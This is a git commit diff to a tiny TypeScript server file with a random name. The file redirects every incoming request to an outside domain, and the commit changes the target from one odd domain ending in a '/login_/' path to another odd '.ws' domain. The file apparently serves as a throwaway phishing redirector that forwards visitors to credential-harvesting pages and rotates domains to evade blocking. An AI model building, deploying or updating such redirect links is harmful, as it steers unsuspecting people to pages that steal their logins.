2666c2835236d1953629d511c4362ada9f121377
Havillah1010 <agentpatrickjones@gmail.com>
2025-10-04 18:50:53 +0100

    Update potl4tch5vvc.ts

--- potl4tch5vvc.ts
+++ potl4tch5vvc.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://burhedftvertactsonline.info/burkhe/login_/",
+      Location: "https://acedigiaceeonpi.ws/pimaa/",
     },
   });
 });
